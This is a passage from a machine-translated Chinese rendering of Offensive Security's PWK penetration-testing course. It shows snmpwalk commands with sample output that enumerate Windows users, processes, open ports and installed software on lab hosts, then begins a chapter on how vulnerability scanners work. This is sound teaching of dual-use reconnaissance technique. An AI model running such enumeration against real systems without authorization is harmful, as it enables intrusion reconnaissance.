<div style="position:absolute;top:241725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定 SNMP 版本号以及</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-t 10</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以将超时时间增加到 10</font></font></nobr></div>
<div style="position:absolute;top:241745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">秒：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:241780;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">snmpwalk -c public -v1 -t 10 10.11.1.14</font></font></font></b></nobr></div>
<div style="position:absolute;top:241797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.2.1.1.1.0 = STRING：“硬件：x86 Family 6 Model 12 Stepping 2 AT/AT COMPAT</font></font></nobr></div>
<div style="position:absolute;top:241813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IBLE - 软件：Windows 2000 版本 5.1（Build 2600 Uniprocessor Free）”</font></font></nobr></div>
<div style="position:absolute;top:241830;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.2.1.1.2.0 = OID：iso.3.6.1.4.1.311.1.1.3.1.1</font></font></nobr></div>
<div style="position:absolute;top:241847;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.2.1.1.3.0 = 计时：(2005539644) 232 天，2:56:36.44</font></font></nobr></div>
<div style="position:absolute;top:241864;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.2.1.1.4.0 = ""</font></font></nobr></div>
<div style="position:absolute;top:241882;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:241901;left:280"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 269 - 使用 snmpwalk 枚举整个 MIB 树</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:241932;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.6.3.2 枚举 Windows 用户</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:241966;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此示例枚举 Windows 用户：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:242001;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25</font></font></font></b></nobr></div>
<div style="position:absolute;top:242018;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.4.1.77.1.2.25.1.1.3.98.111.98 = 字符串：“鲍勃”</font></font></nobr></div>
<div style="position:absolute;top:242035;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING：“客人”</font></font></nobr></div>
<div style="position:absolute;top:242052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.4.1.77.1.2.25.1.1.8.73.85.83.82.95.66.79.66 = 字符串：“IUSR_BOB”</font></font></nobr></div>
<div style="position:absolute;top:242069;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:242088;left:289"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 270 - 使用 snmpwalk 枚举 Windows 用户</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:242119;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.6.3.3 枚举正在运行的 Windows 进程</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:242154;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此示例枚举正在运行的 Windows 进程：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:242189;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2</font></font></font></b></nobr></div>
<div style="position:absolute;top:242206;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.2.1.25.4.2.1.2.1 = STRING：“系统空闲进程”</font></font></nobr></div>
<div style="position:absolute;top:242223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.2.1.25.4.2.1.2.4 = 字符串：“系统”</font></font></nobr></div>
<div style="position:absolute;top:242240;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.2.1.25.4.2.1.2.224 = 字符串：“smss.exe”</font></font></nobr></div>
<div style="position:absolute;top:242257;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.2.1.25.4.2.1.2.324 = 字符串：“csrss.exe”</font></font></nobr></div>
<div style="position:absolute;top:242274;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.2.1.25.4.2.1.2.364 = 字符串：“wininit.exe”</font></font></nobr></div>
<div style="position:absolute;top:242290;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.2.1.25.4.2.1.2.372 = 字符串：“csrss.exe”</font></font></nobr></div>
<div style="position:absolute;top:242307;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.2.1.25.4.2.1.2.420 = 字符串：“winlogon.exe”</font></font></nobr></div>
<div style="position:absolute;top:242324;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.2.1.25.4.2.1.2.448 = 字符串：“services.exe”</font></font></nobr></div>
<div style="position:absolute;top:242341;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.2.1.25.4.2.1.2.480 = 字符串：“lsass.exe”</font></font></nobr></div>
<div style="position:absolute;top:242359;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.2.1.25.4.2.1.2.488 = 字符串：“lsm.exe”</font></font></nobr></div>
<div style="position:absolute;top:242375;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:242395;left:275"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 271 - 使用 snmpwalk 枚举 Windows 进程 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:242527;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="205"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第205页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:242560;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:243637;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:243637;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:243637;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">205</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:242656;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.6.3.4 枚举打开的 TCP 端口</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:242691;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此示例枚举打开的 TCP 端口：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:242725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3</font></font></font></b></nobr></div>
<div style="position:absolute;top:242742;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.2.1.6.13.1.3.0.0.0.0.21.0.0.0.0.18646 = 整数：21</font></font></nobr></div>
<div style="position:absolute;top:242759;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.2.1.6.13.1.3.0.0.0.0.80.0.0.0.0.45310 = 整数：80</font></font></nobr></div>
<div style="position:absolute;top:242776;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.2.1.6.13.1.3.0.0.0.0.135.0.0.0.0.24806 = 整数：135</font></font></nobr></div>
<div style="position:absolute;top:242793;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.2.1.6.13.1.3.0.0.0.0.443.0.0.0.0.45070 = 整数：443</font></font></nobr></div>
<div style="position:absolute;top:242810;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:242829;left:288"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 272 - 使用 snmpwalk 枚举打开的 TCP 端口</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:242860;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.6.3.5 枚举已安装的软件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:242895;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此示例枚举已安装的软件：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:242930;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2</font></font></font></b></nobr></div>
<div style="position:absolute;top:242947;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.2.1.25.6.3.1.2.1 = STRING：“LiveUpdate 3.3（赛门铁克公司）”</font></font></nobr></div>
<div style="position:absolute;top:242964;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.2.1.25.6.3.1.2.2 = 字符串：“WampServer 2.5”</font></font></nobr></div>
<div style="position:absolute;top:242981;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.2.1.25.6.3.1.2.3 = 字符串：“VMware 工具”</font></font></nobr></div>
<div style="position:absolute;top:242998;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.2.1.25.6.3.1.2.4 = STRING：“Microsoft Visual C++ 2008 Redistributable - x86</font></font></nobr></div>
<div style="position:absolute;top:243015;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.0.30729.4148"</font></font></nobr></div>
<div style="position:absolute;top:243032;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iso.3.6.1.2.1.25.6.3.1.2.5 = STRING：“Microsoft Visual C++ 2012 Redistributable (x86)</font></font></nobr></div>
<div style="position:absolute;top:243049;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 11.0.61030"</font></font></nobr></div>
<div style="position:absolute;top:243066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:243085;left:282"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 273 - 使用 snmpwalk 枚举已安装的软件</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:243116;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.6.3.6 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:243146;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用 oneixtyone 扫描您的目标网络以识别任何 SNMP 服务器。</font></font></nobr></div>
<div style="position:absolute;top:243174;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 使用 snmpwalk 和 snmp-check 收集有关已发现目标的信息。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:243211;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.7 总结</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:243253;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于任何特定情况，从来没有一个“最佳”工具，特别是因为 Kali Linux 中有许多工具</font></font></nobr></div>
<div style="position:absolute;top:243272;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">功能重叠。</font><font style="vertical-align: inherit;">最好让自己熟悉尽可能多的工具，学习</font></font></nobr></div>
<div style="position:absolute;top:243292;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">他们的细微差别，并在可能的情况下，衡量结果以了解背后发生的事情</font></font></nobr></div>
<div style="position:absolute;top:243311;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">场景。</font><font style="vertical-align: inherit;">在某些情况下，“最佳”工具是最有经验的从业者所持有的工具。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:243715;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="206"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第206页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:243748;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:244825;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:244825;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:244825;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">206</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:243838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.7.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:243864;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8. 漏洞扫描</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:243908;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞发现是任何安全评估的一个组成部分。</font><font style="vertical-align: inherit;">虽然我们更喜欢手动，</font></font></nobr></div>
<div style="position:absolute;top:243928;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在安全审计期间利用我们的知识和经验的专业任务，自动化</font></font></nobr></div>
<div style="position:absolute;top:243947;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在适当的环境中使用漏洞扫描程序时，它仍然是无价的。</font><font style="vertical-align: inherit;">在这个模块中，我们</font></font></nobr></div>
<div style="position:absolute;top:243966;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将概述自动漏洞扫描，讨论其各种注意事项，</font></font></nobr></div>
<div style="position:absolute;top:243986;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并专注于 Nessus 和 Nmap 作为不可或缺的工具。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:244023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.1 漏洞扫描概述和注意事项</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:244064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在直接深入我们的工具之前，我们必须花一些时间来讨论漏洞的过程</font></font></nobr></div>
<div style="position:absolute;top:244084;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描，概述有关自动和手动扫描的基本注意事项，以及</font></font></nobr></div>
<div style="position:absolute;top:244103;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">讨论关键的细微差别和最佳实践。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:244138;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.1.1 漏洞扫描器的工作原理</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:244176;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞扫描器的实现各不相同，但通常遵循标准的工作流程。</font><font style="vertical-align: inherit;">最多</font></font></nobr></div>
<div style="position:absolute;top:244195;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动扫描仪将：</font></font></nobr></div>
<div style="position:absolute;top:244228;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 检测目标是否已启动并正在运行。</font></font></nobr></div>
<div style="position:absolute;top:244256;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 执行完全或部分端口扫描，具体取决于配置。</font></font></nobr></div>
<div style="position:absolute;top:244285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 使用常见的指纹技术识别操作系统。</font></font></nobr></div>
<div style="position:absolute;top:244313;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 尝试使用常见技术（例如横幅抓取、</font></font></nobr></div>
<div style="position:absolute;top:244332;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务行为识别，或文件发现。</font></font></nobr></div>
<div style="position:absolute;top:244361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5. 执行</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">签名匹配</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">过程以发现漏洞。</font></font></nobr></div>
<div style="position:absolute;top:244394;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，此过程基本上反映了我们在手动评估期间所做的工作。</font><font style="vertical-align: inherit;">作为渗透</font></font></nobr></div>
<div style="position:absolute;top:244413;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">测试人员，我们可能会在心理上执行某种类型的签名匹配过程。</font><font style="vertical-align: inherit;">例如，我们可能</font></font></nobr></div>
<div style="position:absolute;top:244432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请记住，我们在现场发现的应用程序的特定版本容易受到远程攻击</font></font></nobr></div>
<div style="position:absolute;top:244451;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开发。</font><font style="vertical-align: inherit;">然而，自动扫描仪在独特的帮助下执行此步骤</font></font></nobr></div>
<div style="position:absolute;top:244471;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">签名</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">219</font></font></font></nobr></div>
<div style="position:absolute;top:244504;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为此签名匹配过程的一部分，许多扫描仪使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">横幅抓取</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，这是一个简单的</font></font></nobr></div>
<div style="position:absolute;top:244523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获取与应用程序初始交互期间生成的文本字符串的技术</font></font></nobr></div>
<div style="position:absolute;top:244542;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并进行了分析。</font><font style="vertical-align: inherit;">某些应用程序会生成非常具体的横幅，例如 OpenSSH，它可能会</font></font></nobr></div>
<div style="position:absolute;top:244562;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回“SSH-2.0-OpenSSH_7.9p1 Debian-10”，让我们可以精确定位应用程序</font></font></nobr></div>
<div style="position:absolute;top:244581;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版本，而其他版本，例如 Apache Tomcat 版本 4.1.x 到 8.0.x，返回通用 HTTP 标头</font></font></nobr></div>
<div style="position:absolute;top:244600;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“Apache-Coyote/1.1”。</font><font style="vertical-align: inherit;">自然地，更具体的标题和横幅使</font></font></nobr></div>
<div style="position:absolute;top:244620;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描仪来确定应用程序版本并通过扩展来准确检测潜在的</font></font></nobr></div>
<div style="position:absolute;top:244639;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:244775;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">219 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（IEEE，2020），https://ieeexplore.ieee.org/document/1623997</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:244903;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="207"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第207页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:244936;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:246013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:246013;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:246013;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">207</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:245026;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.1.1.1.1</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:245076;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一些漏洞扫描器可以配置为利用漏洞</font></font></i></nobr></div>
<div style="position:absolute;top:245095;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检测。</font><font style="vertical-align: inherit;">这可以减少误报的可能性，但也增加了</font></font></i></nobr></div>
<div style="position:absolute;top:245115;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务崩溃的风险。</font><font style="vertical-align: inherit;">请务必仔细检查扫描仪选项。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:245177;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大多数自动扫描仪在签名期间检查各种其他目标信息 -</font></font></nobr></div>
<div style="position:absolute;top:245196;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">匹配过程。</font><font style="vertical-align: inherit;">然而，即使是强签名匹配也不能保证存在</font></font></nobr></div>
<div style="position:absolute;top:245215;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的一个漏洞。</font><font style="vertical-align: inherit;">这意味着自动扫描仪会产生相当多的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">误报</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">220</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font></nobr></div>
<div style="position:absolute;top:245235;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相比之下，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏报</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">221</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，其中由于签名而忽略了漏洞</font></font></nobr></div>
<div style="position:absolute;top:245254;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不匹配。</font><font style="vertical-align: inherit;">由于</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反向移植</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">222</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">中</font><font style="vertical-align: inherit;">也可能出现误报和否定的情况</font><font style="vertical-align: inherit;">，其中</font></font></nobr></div>
<div style="position:absolute;top:245273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">软件包维护者将软件安全补丁“回滚”到旧版本。</font><font style="vertical-align: inherit;">可能会导致向后移植</font></font></nobr></div>
<div style="position:absolute;top:245293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在扫描器中将软件标记为易受攻击的版本，而该漏洞实际上已被</font></font></nobr></div>
<div style="position:absolute;top:245312;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">修复。</font></font></nobr></div>
<div style="position:absolute;top:245345;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正因为如此，我们应该仔细检查和手动审查漏洞扫描结果</font></font></nobr></div>
<div style="position:absolute;top:245364;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只要有可能。</font><font style="vertical-align: inherit;">鉴于不断变化和复杂的技术环境，漏洞可能</font></font></nobr></div>
<div style="position:absolute;top:245384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出现在意想不到的地方。</font><font style="vertical-align: inherit;">与一些最好的市售扫描仪一样好，</font></font></nobr></div>
<div style="position:absolute;top:245403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有一个是完美的。</font><font style="vertical-align: inherit;">但是，通过在每次交战前更新签名数据库，我们</font></font></nobr></div>
<div style="position:absolute;top:245422;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确保我们的扫描仪有最好的机会发现最新的漏洞。</font></font></nobr></div>
<div style="position:absolute;top:245455;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这种签名匹配过程非常有效，并且比完全手动审查要快得多，</font></font></nobr></div>
<div style="position:absolute;top:245475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使自动化漏洞扫描程序成为评估过程中的首选</font></font></nobr></div>
